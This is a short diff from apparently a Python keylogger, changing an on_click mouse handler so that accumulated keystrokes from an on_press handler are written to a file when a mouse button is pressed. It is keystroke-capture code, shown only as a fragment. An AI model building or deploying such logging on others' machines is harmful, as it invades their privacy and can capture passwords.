@@ -73,8 +73,9 @@ def on_press(key):
         keys = []
 
 
-def on_click():
-    write_file(keys)
+def on_click(x, y, boton, presionado):
+    if presionado:
+        write_file(keys)
 
 
 def write_file(keys):
